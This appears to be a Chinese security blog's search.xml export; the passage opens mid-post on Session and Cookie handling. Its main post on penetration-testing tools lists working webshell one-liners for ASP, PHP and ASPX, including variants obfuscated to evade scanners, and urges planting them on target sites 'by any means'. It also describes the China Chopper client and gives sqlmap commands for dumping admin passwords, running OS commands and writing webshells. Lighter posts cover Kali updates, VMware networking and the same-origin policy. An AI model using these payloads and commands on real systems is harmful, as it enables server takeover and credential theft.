Web提供了一种方法：UR地址L重写。<br>③重写URL地址：<br>原理：将该用户Session的id信息重写到URL地址中，服务器解析重写后的URL获取Session的id，不支持Cookie也可以记录用户状态。</li><li><p>Session中禁止使用Cookie：<br>既然存在有些浏览器不支持Cookie，为了统一，索性禁止Session使用Cookie，统一使用URL地址重写。<br>禁用方法：打开项目sessionWeb的WebRoot目录下的META-INF文件夹，打开context.xml，修改属性。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Context</span> <span class="attr">path</span>=<span class="string">"/sessionWeb"</span><span class="attr">cookies</span>=<span class="string">"false"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意：该配置只是禁止Session使用Cookie作为识别标志，并不能阻止其他的Cookie读写。也就是说服务器不会自动维护名为JSESSIONID的Cookie了，但是程序中仍然可以读写其他的Cookie</p></li></ol><h1 id="浏览器工作机制"><a href="#浏览器工作机制" class="headerlink" title="浏览器工作机制"></a><font color="#FF0000">浏览器工作机制</font></h1><ol><li>浏览器主要是解析渲染Web中间件响应的HTML、JavaScript、CSS等资源。<br><img src="https://s2.ax1x.com/2019/03/06/kvpBQO.png" alt="image"></li><li>HTML：用来描述Web网页的一种静态标记语言。Web浏览器的作用是读取HTML文档，并以网页的形式显示他们。浏览器不会显示HTML标签，而是使用标签来解释页面的内容。 </li><li>JavaScript是一种轻量级的脚本语言，JavaScript代码可插入HTML页面，并由所有的现代浏览器执行，JavaScript能够改变任意HTML元素的大多属性，JavaScript往往用来改善HTML的展现，比如炫酷的网页效果、移动鼠标自动改变的网页颜色等</li></ol><p>#未完待续……</p>]]></content>
      
      
      <categories>
          
          <category> Web知识基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP代理 </tag>
            
            <tag> webshell </tag>
            
            <tag> Cookie </tag>
            
            <tag> Session </tag>
            
            <tag> 默认网关 </tag>
            
            <tag> 子网掩码 </tag>
            
            <tag> DNS服务器 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>渗透测试常用工具介绍</title>
      <link href="/2019/03/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/"/>
      <url>/2019/03/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<center><font color="#4094C7" size="4">渗透测试常用工具介绍</font></center><h1 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a><font color="#FF0000">一句话木马</font></h1><hr><ol><li>介绍：一句话木马基于B/S结构，在注册信息的电子邮箱或者个人主页等中插入。<br>eval函数:把字符串按照PHP代码来执行，该字符串必须是合法的代码，且必须以分号结尾。<br>$_POST:PHP超全局变量$_GET和$_POST用于收集表单数据(form-data)  </li><li>使用方法：找到数据库是asp格式的网站，然后，以留言板，或者发表文章的方式，把一句话添加到asp数据库，或者加进asp网页<br><strong>记住!我们的目的是<font color="#FF0000">把一句话&lt;%execute request(“value”)%&gt;添加到数据库</font>,无论任何方式!</strong>  </li><li>服务器错误：当我们在一个asp文件中添加了一句话后，就会出现类型不匹配的错误。(Description:类型不匹配: ‘execute’)  </li><li>解决方法:用”eval”替换掉”execute”服务端,就不会出错了!</li><li>运行介绍：通过中国菜刀，一句话木马可以实现功能(上传文件、下载文件、修改文件、执行命令、数据库操作……)</li><li>位置：一句话木马可能在隐藏在正常的php文件中，也可以是一个单独的php(asp、aspx等)文件</li></ol><h1 id="常见一句话木马"><a href="#常见一句话木马" class="headerlink" title="常见一句话木马"></a><font color="#FF0000">常见一句话木马</font></h1><hr><ol><li><p>asp一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%execute(request(<span class="string">"value"</span>))%&gt;</span><br></pre></td></tr></table></figure></li><li><p>php一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[value]);<span class="meta">?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>aspx一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=<span class="string">"Jscript"</span>%&gt;、&lt;%<span class="keyword">eval</span>(Request.Item[<span class="string">"value"</span>])%&gt;</span><br></pre></td></tr></table></figure></li><li><p>其他一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="keyword">eval</span> request(<span class="string">"value"</span>)%&gt;</span><br><span class="line">&lt;%execute request(<span class="string">"value"</span>)%&gt;</span><br><span class="line">&lt;%execute(request(<span class="string">"value"</span>))%&gt;</span><br><span class="line">&lt;%<span class="keyword">If</span> Request(<span class="string">"value"</span>)&lt;&gt;<span class="string">""</span> Then Execute(Request(<span class="string">"value"</span>))%&gt;</span><br><span class="line">&lt;%<span class="keyword">if</span> request (<span class="string">"value"</span>)&lt;&gt;<span class="string">""</span>then session(<span class="string">"value"</span>)=request(<span class="string">"value"</span>):end <span class="keyword">if</span>:<span class="keyword">if</span> session(<span class="string">"value"</span>)&lt;&gt;<span class="string">""</span> then execute session(<span class="string">"value"</span>)%&gt;</span><br><span class="line">&lt;SCRIPT language=VBScript runat=<span class="string">"server"</span>&gt;execute request(<span class="string">"value"</span>)&lt;/SCRIPT&gt;</span><br><span class="line">&lt;%@ Page Language=<span class="string">"Jscript"</span>%&gt;</span><br><span class="line">&lt;%<span class="keyword">eval</span>(Request.Item[<span class="string">"value"</span>],<span class="string">"unsafe"</span>);%&gt;</span><br></pre></td></tr></table></figure></li><li><p>可以躲过雷客图的一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">set ms = server.CreateObject(<span class="string">"MSScriptControl.ScriptControl.1"</span>)</span><br><span class="line">ms.Language=<span class="string">"VBScript"</span></span><br><span class="line">ms.AddObject <span class="string">"Response"</span>, Response</span><br><span class="line">ms.AddObject <span class="string">"request"</span>, request</span><br><span class="line">ms.ExecuteStatement(<span class="string">"ev"</span>&amp;<span class="string">"al(request("</span><span class="string">"value"</span><span class="string">"))"</span>)</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></li><li><p>不用”&lt;,&gt;”的asp一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=VBScript runat=server&gt;execute request(<span class="string">"value"</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>不用双引号的一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="keyword">eval</span> request(chr(<span class="number">35</span>))%&gt;</span><br></pre></td></tr></table></figure></li><li><p>UTF-7编码加密:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ codepage=<span class="number">65000</span>%&gt;&lt;% response.Charset=”<span class="number">936</span>″%&gt;&lt;%e+j-x+j-e+j-c+j-u+j-t+j-e+j-(+j-r+j-e+j-q+j-u+j-e+j-s+j-t+j-(+j-+ACI-<span class="comment">#+ACI)+j-)+j-%&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a><font color="#FF0000">中国菜刀</font></h1><hr><p>介绍：一款专业的网站管理软件，用途广泛，使用方便，小巧实用。只要支持动态脚本的网站，都可以用中国菜刀来进行管理！在非简体中文环境下使用，自动切换到英文界面。</p><ol><li>文件管理：[特色]缓存下载目录，并支持离线查看缓存目录;</li><li>虚拟终端：[特色]人性化的设计，操作方便;(输入HELP查看更多用法)</li><li>数据库管理：[特色]图形界面,支持MYSQL,MSSQL,ORACLE,INFOMIX,ACCESS，以入支持ADO方式连接的数据库。</li><li>网站蜘蛛：织出一张网站的目录结构。<br><img src="https://s2.ax1x.com/2019/03/04/kOBh2n.png" alt="image"></li></ol><h1 id="大马"><a href="#大马" class="headerlink" title="大马"></a><font color="#FF0000">大马</font></h1><hr><p>大马一般具有文件操作、命令执行、提取、目录浏览等功能。<br>大马不需要中国菜刀，它本身就集成了完成各种功能所需要的代码。</p><h1 id="火狐插件——hackbar"><a href="#火狐插件——hackbar" class="headerlink" title="火狐插件——hackbar"></a><font color="#FF0000">火狐插件——hackbar</font></h1><hr><ol><li>hackbar是火狐浏览器的一个扩展插件，添加之后，按f12,出现在下方的导航栏上最后一位。</li><li>功能：SQL注入、XSS文件上传、编码解码等等<br><img src="https://s2.ax1x.com/2019/03/04/kOd0g0.png" alt="image"></li></ol><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a><font color="#FF0000">sqlmap</font></h1><hr><ol><li>介绍：SQLmap是一款用来检测与利用SQL注入漏洞的免费开源工具，有一个非常棒的特性，即对检测与利用的自动化处理(数据库指纹、访问底层文件系统、执行命令)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">Sqlmap使用:</span><br><span class="line">三种类型的sql注入检测：</span><br><span class="line">①GET方式的注入检测：URL显示并且传输的方式 </span><br><span class="line"> 语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot;</span><br><span class="line">②POST方式的注入检测：隐秘传输方式</span><br><span class="line">    语句：sqlmap -u &quot;http://www.***.com.cn/document.php&quot; --data &quot;id=5&quot;</span><br><span class="line">③Cookie中转注入(通过cookie提交注入语句)(如果注入网站需要经过登录界面，可以添加抓包到的cookie信息到cookie参数中)：</span><br><span class="line">    语句：sqlmap -u http://172.16.12.2/onews.asp --cookie &quot;id=40&quot; --level 3 --dbs --tables</span><br><span class="line">    -u 代表要测试的Url，--cookie表示使用cookie的方式提交， --level 表示测试的等级, --dbs表示将数据库显示出来，--tables是将表名显示出来</span><br><span class="line"></span><br><span class="line">    语句：sqlmap.py -u http://172.16.12.2/onews.asp --cookie &quot;id=40&quot; --level 3 --dbs -T admin --columns</span><br><span class="line">    -T代表 当前要猜解的表名， --columns 代表猜解列</span><br><span class="line"></span><br><span class="line">    语句：sqlmap.py -u http://172.16.12.2/onews.asp --cookie &quot;id=40&quot; --level 3 --dbs -T admin -C admin password --dump</span><br><span class="line">    --dump的意思是 将数据内容脱到本地</span><br><span class="line"></span><br><span class="line">一：sqlmap中自带了识别waf的模块可以识别出网站的waf种类，如果安装的waf没有什么特征，识别出来的就是：Generic。</span><br><span class="line">    语句：sqlmap -u &quot;http://www.***.com.cn/document.php&quot; --identify-waf --batch</span><br><span class="line"></span><br><span class="line">二：获取数据库的数据库类型以及版本</span><br><span class="line">语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot;</span><br><span class="line"></span><br><span class="line">三：获取数据库的库名和用户名</span><br><span class="line">    ①获取数据库库名、表名、列名、字段</span><br><span class="line">     语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot; --current-db</span><br><span class="line">     语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot; --tables -D &quot;asq&quot;</span><br><span class="line">     语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot; --columns -T &quot;nt_admin&quot; -D &quot;asq&quot;</span><br><span class="line">     语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot; --dump -C &quot;admin_password&quot; -T &quot;nt_admin&quot; -D &quot;asq&quot;</span><br><span class="line">    ②获取数据库用户名</span><br><span class="line">     语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot; --current-user</span><br><span class="line"></span><br><span class="line">四：获取数据库的数据量</span><br><span class="line"> 语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot; --count -D &quot;asq&quot;</span><br><span class="line"></span><br><span class="line">五：判断用户权限（sqlserver最高权限用户名:sa;mysql最高权限用户名:root）</span><br><span class="line"> 语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot; --privileges</span><br><span class="line"></span><br><span class="line">六：管理远程数据库</span><br><span class="line">    ①远程连接数据库</span><br><span class="line">     语句：sqlmap –d &quot;mysql://用户名:密码@地址:端口/数据库名&quot;</span><br><span class="line">    ②管理数据库</span><br><span class="line">     语句：sqlmap –d &quot;mysql://用户名:密码@地址:端口/数据库名&quot; --sql –shell</span><br><span class="line"></span><br><span class="line">七：延时注入：挖掘SQL注入过程中，页面无变化、无法用布尔真假判断、无法报错的情况下使用延时注入技术。缺点：耗时长</span><br><span class="line"> 语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot; --delay 10</span><br><span class="line">（延迟时间）</span><br><span class="line">     语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot; -safe-freq</span><br><span class="line">八：(命令执行)提权 </span><br><span class="line">     语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot; --os-cmd =&quot;net user&quot;</span><br><span class="line">         （交互式命令必须知道网站的绝对路径）</span><br><span class="line">九、交互式写webshell：</span><br><span class="line"> 语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot; --os-shell</span><br><span class="line">    （会自动生成两个文件，可以通过网页访问，上传文件和执行代码，也可以直接加变量?cmd=”命令”）</span><br><span class="line">    （退出os-shell后，会自动删除这两个文件）</span><br><span class="line"></span><br><span class="line">十、Tamper脚本的使用和介绍</span><br><span class="line">语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot; --tamper=&quot;randomcase.py&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">十一：本地写入webshell</span><br><span class="line">     ①先在sqlmap目录下创建一个目录（mst）</span><br><span class="line">     ②需要管理员权限才能写入</span><br><span class="line">     ③两个参数</span><br><span class="line">         --file-write&quot;./mst/mst.txt&quot; 本地文件的地址</span><br><span class="line">      --file-dest&quot;d:/www/1.html&quot; 目标文件的地址</span><br><span class="line"> 语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot; --file-write&quot;./net/net.txt&quot; </span><br><span class="line">              --file-dest &quot;d:/www/1.html&quot;</span><br><span class="line"></span><br><span class="line">十二：批量检测注入</span><br><span class="line">     ①先将需要的URL都写入记事本</span><br><span class="line">       http://www.***.com.cn/document.php?a=1</span><br><span class="line">       http://www.***.com.cn/document.php?b=2</span><br><span class="line">       http://www.***.com.cn/document.php?c=3</span><br><span class="line">       http://www.***.com.cn/document.php?d=4</span><br><span class="line">       http://www.***.com.cn/document.php?e=5</span><br><span class="line">语句：sqlmap -m &apos;/media/sf_share/sqlmapceshi.txt&apos;</span><br><span class="line">     </span><br><span class="line">     ②配置好BurpSuite：</span><br><span class="line">      将BurpSuite的request记录保存到.log文件中</span><br><span class="line">语句：sqlmap -l burp.log --batch -smart</span><br><span class="line">（Smart：启发式快速判断，节约时间。Batch：自动选择yes）</span><br><span class="line">（level=(1-5)：要执行的测试水平等级,默认1。risk=(0-3)：要执行的风险等级,默认1）</span><br><span class="line"></span><br><span class="line">十三：-v数字 (七个等级，默认为1)</span><br><span class="line">0：只显示python错误以及严重的信息</span><br><span class="line">1：同时显示信息和警告信息(默认)</span><br><span class="line">2：同时显示debug的信息</span><br><span class="line">3：同时显示注入的payload</span><br><span class="line">4：同时显示HTTP请求</span><br><span class="line">5：同时显示HTTP响应头</span><br><span class="line">6：同时显示HTTP响应页面</span><br><span class="line"></span><br><span class="line">十四：结合BurpSuite抓包</span><br><span class="line">     ①使用参数--proxy=http://127.0.0.1:8080</span><br><span class="line">       语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot; --proxy=&quot;http://127.0.0.1:8080&quot;</span><br><span class="line"></span><br><span class="line">其他类型的数据库：MongoDB、NoSQL，sqlmap不支持但是可以通过nosqlmap注入</span><br><span class="line">网址：https://github.com/tcstool/nosqlmap</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://s2.ax1x.com/2019/03/05/kjJ5Dg.png" alt="image"></p><h1 id="linux常用系统命令与功能-netstat、whoami、useradd、passwd"><a href="#linux常用系统命令与功能-netstat、whoami、useradd、passwd" class="headerlink" title="linux常用系统命令与功能(netstat、whoami、useradd、passwd)"></a><font color="#FF0000">linux常用系统命令与功能(netstat、whoami、useradd、passwd)</font></h1><hr><p><img src="https://s2.ax1x.com/2019/03/05/kjtXBF.png" alt="image"></p><h1 id="windows常用系统命令与功能-ping、netstat、net-user、req、systeminfo"><a href="#windows常用系统命令与功能-ping、netstat、net-user、req、systeminfo" class="headerlink" title="windows常用系统命令与功能(ping、netstat、net user、req、systeminfo)"></a><font color="#FF0000">windows常用系统命令与功能(ping、netstat、net user、req、systeminfo)</font></h1><hr><ol><li>ping：可以对目标URL或者IP地址发送数据包，可以通过查看数据包是否丢失查看主机与目标机之间是否能够通讯。<br><img src="https://s2.ax1x.com/2019/03/05/kjttl6.png" alt="image"></li></ol><p>#未完待续……</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 一句话木马 </tag>
            
            <tag> 中国菜刀 </tag>
            
            <tag> 大马 </tag>
            
            <tag> hackbar </tag>
            
            <tag> sqlmap </tag>
            
            <tag> linux常用系统命令和功能 </tag>
            
            <tag> Windows常用系统命令和功能 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>kali linux使用技巧</title>
      <link href="/2019/02/26/kali%20linux%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
      <url>/2019/02/26/kali%20linux%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="kali-linux-使用技巧"><a href="#kali-linux-使用技巧" class="headerlink" title="kali linux 使用技巧"></a><center><font color="#4094C7" size="4">kali linux 使用技巧</font></center></h2><h1 id="系统和软件更新"><a href="#系统和软件更新" class="headerlink" title="系统和软件更新"></a><font color="#FF0000">系统和软件更新</font></h1><hr><ol><li><font color="#FF0000">apt update</font>  ：只检查，不更新（已安装的软件包是否有可用的更新，给出汇总报告）。  </li><li><font color="#FF0000">apt upgrade</font> ：更新已安装的软件包</li><li><font color="#FF0000">apt dist-upgrade</font>：apt upgrade 和 apt dist-upgrade 本质上是没有什么不同的。只不过，dist-upgrade 会识别出当依赖关系改变的情形并作出处理，而upgrade对此情形不处理。例如软件包 a 原先依赖 b c d，但是在源里面可能已经升级了，现在是 a 依赖 b c e。这种情况下，dist-upgrade 会删除 d 安装 e，并把 a 软件包升级，而 upgrade 会认为依赖关系改变而拒绝升级 a 软件包。  </li><li>从上述可以看出，在执行apt upgrade和apt dist-upgrade之前应该先执行apt update。</li></ol><h1 id="三种网络模式介绍"><a href="#三种网络模式介绍" class="headerlink" title="三种网络模式介绍"></a><font color="#FF0000">三种网络模式介绍</font></h1><hr><ol><li><p>桥接模式：虚拟机和实体机在同一个网段<br><img src="https://s2.ax1x.com/2019/03/03/kL6NGQ.png" alt="image"><br>VMware设置过程：编辑-&gt;虚拟网络编辑器-&gt;更改设置-&gt;桥接到-&gt;自动(也可以选择对应的网卡)-&gt;将虚拟机网络修改为桥接网络。<br>桥接模式下，实体机可以上网，虚拟机就可以上网。</p></li><li><p>NAT模式(网络地址转换模式)：虚拟机和实体机不在一个网段，相当于虚拟机将实体机作为路由器。<br><img src="https://s2.ax1x.com/2019/03/03/kL6XQA.md.png" alt="image"><br>VMware设置过程：编辑-&gt;虚拟网络编辑器-&gt;更改设置-&gt;NAT模式-&gt;可以修改子网IP和子网掩码！</p></li><li><p>主机模式：虚拟机只能访问实体机，无法上网。设置过程和上面相同。<br><img src="https://s2.ax1x.com/2019/03/03/kLctw6.png" alt="image"></p></li></ol><h1 id="虚拟机快照"><a href="#虚拟机快照" class="headerlink" title="虚拟机快照"></a><font color="#FF0000">虚拟机快照</font></h1><hr><p>虚拟机的快照功能允许我们对当前虚拟机的所有运行状态(包括安装的软件、正在执行的程序)进行“定格”，以便恢复到快照时。<br><img src="https://s2.ax1x.com/2019/03/03/kLgT8e.png" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> VWware使用技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> VWmare </tag>
            
            <tag> 虚拟机快照 </tag>
            
            <tag> 三种网络模式 </tag>
            
            <tag> 系统和软件更新 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>XSS 文件上传漏洞 同源策略</title>
      <link href="/2018/12/13/XSS%E6%BC%8F%E6%B4%9E%E2%80%94%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"/>
      <url>/2018/12/13/XSS%E6%BC%8F%E6%B4%9E%E2%80%94%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/</url>
      
        <content type="html"><![CDATA[<center><font color="#4094C7" size="4">XSS 文件上传漏洞 同源策略</font></center><h1 id="同源策略"><a href="#同源策略" class="headerlink" title=" - 同源策略"></a><font color="#FF0000"> - 同源策略</font></h1><hr><p>所谓同源策略，指的是浏览器对<font color="#FF0000">不同源的脚本或者文本的访问方式进行的限制</font>。<br>比如源a的js不能读取或设置引入的源b的元素属性。</p><h1 id="1-1-同源定义"><a href="#1-1-同源定义" class="headerlink" title=" - 1.1 同源定义 "></a><font color="#FF0000"> - 1.1 同源定义 </font></h1><hr><p>所谓同源，就是指两个页面具有相同的协议，主机（也常说域名），端口，三个要素缺一不可。<br>(同协议，同IP地址，同端口，缺一不可)  </p><p>其实：同源策略限制了不同源之间的交互主要针对的是js中的XMLHttpRequest等请求。<br>如下情况不受同源策略的影响：  </p><blockquote><p>1.页面中的链接，重定向以及表单提交是不会受到同源策略限制的。<br>链接就不用说了，导航网站上的链接都是链接到其他站点的。而你在域名<br><a href="http://www.foo.cm" target="_blank" rel="noopener">www.foo.cm</a> 下面提交一个表单到 <a href="http://www.bar.cm" target="_blank" rel="noopener">www.bar.cm</a> 是完全可以的。  </p></blockquote><blockquote><p>2.跨域资源嵌入是允许的，当然，浏览器限制了Javascript不能读写加载的内容。 </p></blockquote><h1 id="1-1-同源定义-1"><a href="#1-1-同源定义-1" class="headerlink" title=" - 1.1 同源定义 "></a><font color="#FF0000"> - 1.1 同源定义 </font></h1><hr><h1 id="1-1-同源定义-2"><a href="#1-1-同源定义-2" class="headerlink" title=" - 1.1 同源定义 "></a><font color="#FF0000"> - 1.1 同源定义 </font></h1><hr>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 漏洞 </tag>
            
            <tag> 同源策略 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hussar的安全学习心得和体会</title>
      <link href="/2018/12/10/%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97%E6%84%9F%E5%8F%97/"/>
      <url>/2018/12/10/%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97%E6%84%9F%E5%8F%97/</url>
      
        <content type="html"><![CDATA[<center><font color="#4094C7" size="4">网络安全学习 个人心得和感受</font></center><hr><h1 id="安全学习需要很大的毅力"><a href="#安全学习需要很大的毅力" class="headerlink" title=" - 安全学习需要很大的毅力  "></a><font color="#FF0000"> - 安全学习需要很大的毅力  </font></h1><p>很多人看过黑客帝国和一些黑客电影，电影中的黑客们就像古代的武林高手一样，那些炫酷的操作和技术能够在几秒钟之内做出许多炫酷的事情。其实学安全炫酷只是几秒，枯燥会更长久。台上三分钟，台下十年功，没有长时间的积累，很难学好安全。面对着很多看着就麻烦的代码和难以理解的理论概念，没有足够的毅力坚持下去，是学不好的。</p>]]></content>
      
      
      <categories>
          
          <category> 个人观点和心得 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 自我鼓励 </tag>
            
            <tag> 心得感想 </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
